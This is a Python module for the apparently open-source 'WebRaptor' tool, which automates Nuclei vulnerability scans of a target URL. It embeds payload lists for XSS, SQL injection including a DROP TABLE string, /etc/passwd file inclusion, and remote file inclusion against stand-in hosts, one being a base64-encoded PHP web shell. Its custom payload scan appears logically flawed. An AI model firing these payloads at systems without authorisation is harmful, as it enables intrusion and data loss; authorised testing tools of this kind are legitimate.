#!/usr/bin/env python3
"""
WebRaptor Nuclei Integration Module
Advanced vulnerability scanning with Nuclei templates
"""

import os
import sys
import json
import subprocess
import time
import threading
from pathlib import Path
from typing import List, Dict, Optional, Tuple
from colorama import Fore, Style, init
from core.config import Config
from core.tool_manager import ToolManager

init()

# Module metadata
description = "Advanced vulnerability scanning with Nuclei templates and custom payloads"
author = "LakshmikanthanK (@letchu_pkt)"
version = "2.1"

class NucleiScanner:
    """Advanced Nuclei vulnerability scanner integration"""
    
    def __init__(self, config: Config = None):
        self.config = config or Config()
        self.tool_manager = ToolManager()
        self.templates_dir = Path("nuclei-templates")
        self.results_dir = Path("reports/nuclei")
        self.custom_templates_dir = Path("custom-templates")
        
        # Create directories
        self.templates_dir.mkdir(exist_ok=True)
        self.results_dir.mkdir(parents=True, exist_ok=True)
        self.custom_templates_dir.mkdir(exist_ok=True)
        
        # Nuclei configuration
        self.nuclei_config = {
            'timeout': 10,
            'retries': 1,
            'threads': 25,
            'rate_limit': 150,
            'severity': ['critical', 'high', 'medium', 'low', 'info'],
            'tags': [],
            'exclude_tags': [],
            'exclude_severity': [],
            'custom_templates': True,
            'update_templates': True
        }
        
        # Template categories
        self.template_categories = {
            'vulnerabilities': 'Vulnerability detection templates',
            'exposures': 'Information disclosure templates',
            'misconfiguration': 'Configuration issues',
            'cves': 'CVE-specific templates',
            'default-logins': 'Default credential templates',
            'files': 'File detection templates',
            'panels': 'Admin panel detection',
            'technologies': 'Technology fingerprinting',
            'fuzzing': 'Fuzzing templates',
            'workflows': 'Multi-step workflows'
        }
        
        # Custom payloads
        self.custom_payloads = {
            'xss': [
                '<script>alert("XSS")</script>',
                '"><script>alert("XSS")</script>',
                "'><script>alert('XSS')</script>",
                'javascript:alert("XSS")',
                '<img src=x onerror=alert("XSS")>'
            ],
            'sqli': [
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "'; DROP TABLE users--",
                "' OR 1=1#",
                "admin'--"
            ],
            'lfi': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "/etc/passwd",
                "C:\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//etc/passwd"
            ],
            'rfi': [
                "http://evil.com/shell.txt",
                "https://attacker.com/payload.php",
                "ftp://malicious.com/backdoor.php",
                "file:///etc/passwd",
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
            ]
        }
    
    def show_banner(self):
        
        banner = f"""
{Fore.BLUE}
╔══════════════════════════════════════════════════════════════════════════╗
║                     {Fore.YELLOW}WebRaptor Nuclei Scanner v{version}{Fore.BLUE}                      ║
║              Advanced Vulnerability Detection with Nuclei Templates      ║
║                        Author: LakshmikanthanK (@letchu_pkt)             ║
║                                                                          ║
╚══════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(banner)
    
    def check_nuclei_installed(self) -> bool:
      
        return self.tool_manager.check_tool_installed('nuclei')
    
    def install_nuclei(self) -> bool:
       
        if not self.check_nuclei_installed():
            print(f"{Fore.CYAN}[*] Installing Nuclei...{Style.RESET_ALL}")
            return self.tool_manager.install_tool('nuclei')
        return True
    
    def update_templates(self) -> bool:
        
        if not self.check_nuclei_installed():
            print(f"{Fore.RED}[-] Nuclei not installed{Style.RESET_ALL}")
            return False
        
        try:
            print(f"{Fore.CYAN}[*] Updating Nuclei templates...{Style.RESET_ALL}")
            success, stdout, stderr = self.tool_manager.run_tool('nuclei', ['-update-templates'])
            if success:
                print(f"{Fore.GREEN}[+] Templates updated successfully{Style.RESET_ALL}")
                return True
            else:
                print(f"{Fore.RED}[-] Failed to update templates: {stderr}{Style.RESET_ALL}")
                return False
        except Exception as e:
            print(f"{Fore.RED}[-] Error updating templates: {e}{Style.RESET_ALL}")
            return False
    
    def create_custom_template(self, template_name: str, template_data: Dict) -> bool:
    
        try:
            template_file = self.custom_templates_dir / f"{template_name}.yaml"
            
       
            yaml_content = self._dict_to_yaml_template(template_data)
            
            with open(template_file, 'w') as f:
                f.write(yaml_content)
            
            print(f"{Fore.GREEN}[+] Custom template created: {template_file}{Style.RESET_ALL}")
            return True
        except Exception as e:
            print(f"{Fore.RED}[-] Error creating template: {e}{Style.RESET_ALL}")
            return False
    
    def _dict_to_yaml_template(self, template_data: Dict) -> str:
        """Convert template dictionary to YAML format"""
        yaml_lines = []
        
        # Basic template structure
        yaml_lines.append("id: " + template_data.get('id', 'custom-template'))
        yaml_lines.append("info:")
        yaml_lines.append("  name: " + template_data.get('name', 'Custom Template'))
        yaml_lines.append("  author: " + template_data.get('author', 'webraptor'))
        yaml_lines.append("  severity: " + template_data.get('severity', 'info'))
        yaml_lines.append("  description: " + template_data.get('description', 'Custom vulnerability detection'))
        
        # HTTP requests
        if 'requests' in template_data:
            yaml_lines.append("requests:")
            for i, request in enumerate(template_data['requests']):
                yaml_lines.append(f"  - method: {request.get('method', 'GET')}")
                yaml_lines.append(f"    path:")
                yaml_lines.append(f"      - \"{request.get('path', '/')}\"")
                
                if 'headers' in request:
                    yaml_lines.append("    headers:")
                    for header, value in request['headers'].items():
                        yaml_lines.append(f"      {header}: \"{value}\"")
                
                if 'body' in request:
                    yaml_lines.append(f"    body: \"{request['body']}\"")
        
        # Matchers
        if 'matchers' in template_data:
            yaml_lines.append("matchers:")
            for matcher in template_data['matchers']:
                yaml_lines.append(f"  - type: {matcher.get('type', 'word')}")
                yaml_lines.append(f"    words:")
                for word in matcher.get('words', []):
                    yaml_lines.append(f"      - \"{word}\"")
        
        return '\n'.join(yaml_lines)
    
    def run_scan(self, target: str, scan_type: str = 'comprehensive') -> Dict:
        """Run Nuclei scan with specified parameters"""
        if not self.check_nuclei_installed():
            if not self.install_nuclei():
                return {'success': False, 'error': 'Failed to install Nuclei'}
        
        print(f"{Fore.BLUE}[*] Starting Nuclei scan on {target}...{Style.RESET_ALL}")
        
        # Prepare scan arguments
        args = ['-u', target]
        
        # Add scan-specific arguments
        if scan_type == 'quick':
            args.extend(['-t', 'vulnerabilities/', '-severity', 'critical,high'])
        elif scan_type == 'comprehensive':
            args.extend(['-t', 'vulnerabilities/', '-t', 'exposures/', '-t', 'misconfiguration/'])
        elif scan_type == 'cve':
            args.extend(['-t', 'cves/'])
        elif scan_type == 'default-logins':
            args.extend(['-t', 'default-logins/'])
        elif scan_type == 'custom':
            args.extend(['-t', str(self.custom_templates_dir)])
        
        # Add configuration
        args.extend([
            '-timeout', str(self.nuclei_config['timeout']),
            '-retries', str(self.nuclei_config['retries']),
            '-threads', str(self.nuclei_config['threads']),
            '-rate-limit', str(self.nuclei_config['rate_limit']),
            '-json'
        ])
        
        # Add severity filters
        if self.nuclei_config['severity']:
            args.extend(['-severity', ','.join(self.nuclei_config['severity'])])
        
        # Add tag filters
        if self.nuclei_config['tags']:
            args.extend(['-tags', ','.join(self.nuclei_config['tags'])])
        
        if self.nuclei_config['exclude_tags']:
            args.extend(['-exclude-tags', ','.join(self.nuclei_config['exclude_tags'])])
        
        # Run the scan
        try:
            success, stdout, stderr = self.tool_manager.run_tool('nuclei', args, timeout=600)
            
            if success:
                # Parse JSON results
                results = self._parse_nuclei_results(stdout)
                
                # Save results
                timestamp = time.strftime("%Y%m%d_%H%M%S")
                results_file = self.results_dir / f"nuclei_scan_{target.replace('.', '_')}_{timestamp}.json"
                
                with open(results_file, 'w') as f:
                    json.dump(results, f, indent=2)
                
                print(f"{Fore.GREEN}[+] Nuclei scan completed successfully{Style.RESET_ALL}")
                print(f"{Fore.GREEN}[+] Results saved to: {results_file}{Style.RESET_ALL}")
                
                return {
                    'success': True,
                    'results': results,
                    'file': str(results_file),
                    'findings_count': len(results.get('findings', []))
                }
            else:
                print(f"{Fore.RED}[-] Nuclei scan failed: {stderr}{Style.RESET_ALL}")
                return {'success': False, 'error': stderr}
                
        except Exception as e:
            print(f"{Fore.RED}[-] Error running Nuclei scan: {e}{Style.RESET_ALL}")
            return {'success': False, 'error': str(e)}
    
    def _parse_nuclei_results(self, output: str) -> Dict:
        """Parse Nuclei JSON output"""
        findings = []
        
        for line in output.strip().split('\n'):
            if line.strip():
                try:
                    finding = json.loads(line)
                    findings.append(finding)
                except json.JSONDecodeError:
                    continue
        
        # Categorize findings by severity
        severity_counts = {}
        for finding in findings:
            severity = finding.get('info', {}).get('severity', 'unknown')
            severity_counts[severity] = severity_counts.get(severity, 0) + 1
        
        return {
            'findings': findings,
            'total_findings': len(findings),
            'severity_counts': severity_counts,
            'scan_time': time.strftime('%Y-%m-%d %H:%M:%S')
        }
    
    def display_results(self, results: Dict):
        """Display scan results in a formatted way"""
        if not results.get('success'):
            print(f"{Fore.RED}[-] Scan failed: {results.get('error', 'Unknown error')}{Style.RESET_ALL}")
            return
        
        findings = results.get('results', {}).get('findings', [])
        severity_counts = results.get('results', {}).get('severity_counts', {})
        
        print(f"\n{Fore.BLUE}╔══════════════════════════════════════════════════════════════════════════╗")
        print(f"║                        NUCLEI SCAN RESULTS                           ║")
        print(f"╚══════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        
        # Summary
        print(f"\n{Fore.CYAN}📊 Summary:{Style.RESET_ALL}")
        print(f"  Total Findings: {len(findings)}")
        
        for severity in ['critical', 'high', 'medium', 'low', 'info']:
            count = severity_counts.get(severity, 0)
            if count > 0:
                color = Fore.RED if severity == 'critical' else Fore.YELLOW if severity == 'high' else Fore.WHITE
                print(f"  {color}{severity.capitalize()}: {count}{Style.RESET_ALL}")
        
        # Detailed findings
        if findings:
            print(f"\n{Fore.CYAN}🔍 Detailed Findings:{Style.RESET_ALL}")
            
            for i, finding in enumerate(findings, 1):
                info = finding.get('info', {})
                severity = info.get('severity', 'unknown')
                name = info.get('name', 'Unknown')
                description = info.get('description', 'No description')
                
                # Color code by severity
                severity_color = Fore.RED if severity == 'critical' else Fore.YELLOW if severity == 'high' else Fore.WHITE
                
                print(f"\n{Fore.CYAN}[{i}] {name}{Style.RESET_ALL}")
                print(f"    {severity_color}Severity: {severity.upper()}{Style.RESET_ALL}")
                print(f"    Description: {description}")
                
                # Show matched content if available
                if 'matched-at' in finding:
                    print(f"    Matched at: {finding['matched-at']}")
                
                # Show template info
                if 'template-id' in finding:
                    print(f"    Template: {finding['template-id']}")
    
    def run_custom_payload_scan(self, target: str, payload_type: str) -> Dict:
        """Run scan with custom payloads"""
        if payload_type not in self.custom_payloads:
            print(f"{Fore.RED}[-] Unknown payload type: {payload_type}{Style.RESET_ALL}")
            return {'success': False, 'error': f'Unknown payload type: {payload_type}'}
        
        print(f"{Fore.BLUE}[*] Running custom {payload_type} payload scan...{Style.RESET_ALL}")
        
        # Create custom template for payload testing
        template_data = {
            'id': f'custom-{payload_type}-test',
            'name': f'Custom {payload_type.upper()} Test',
            'author': 'webraptor',
            'severity': 'medium',
            'description': f'Custom {payload_type} payload testing',
            'requests': [
                {
                    'method': 'GET',
                    'path': f'/{payload_type}?param=FUZZ',
                    'headers': {'User-Agent': 'WebRaptor-Scanner'}
                }
            ],
            'matchers': [
                {
                    'type': 'word',
                    'words': self.custom_payloads[payload_type]
                }
            ]
        }
        
        # Create and run custom template
        template_name = f"custom_{payload_type}_test"
        if self.create_custom_template(template_name, template_data):
            return self.run_scan(target, 'custom')
        else:
            return {'success': False, 'error': 'Failed to create custom template'}

def run(target):
    """Main entry point for Nuclei scanner module"""
    try:
        scanner = NucleiScanner()
        scanner.show_banner()
        
        # Check if Nuclei is installed
        if not scanner.check_nuclei_installed():
            print(f"{Fore.YELLOW}[!] Nuclei not found. Installing...{Style.RESET_ALL}")
            if not scanner.install_nuclei():
                print(f"{Fore.RED}[-] Failed to install Nuclei{Style.RESET_ALL}")
                return
        
        # Update templates
        scanner.update_templates()
        
        # Run comprehensive scan
        print(f"{Fore.BLUE}[*] Starting comprehensive vulnerability scan...{Style.RESET_ALL}")
        results = scanner.run_scan(target, 'comprehensive')
        
        # Display results
        scanner.display_results(results)
        
        # Run additional scans
        print(f"\n{Fore.BLUE}[*] Running additional scans...{Style.RESET_ALL}")
        
        # CVE scan
        cve_results = scanner.run_scan(target, 'cve')
        if cve_results.get('success'):
            print(f"{Fore.GREEN}[+] CVE scan completed: {cve_results.get('findings_count', 0)} findings{Style.RESET_ALL}")
        
        # Default logins scan
        login_results = scanner.run_scan(target, 'default-logins')
        if login_results.get('success'):
            print(f"{Fore.GREEN}[+] Default logins scan completed: {login_results.get('findings_count', 0)} findings{Style.RESET_ALL}")
        
        print(f"\n{Fore.GREEN}[+] Nuclei scanning completed successfully!{Style.RESET_ALL}")
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Scan interrupted by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[-] Error in Nuclei scanning: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        run(sys.argv[1])
    else:
        print("Usage: python nuclei_scanner.py <target_url>")
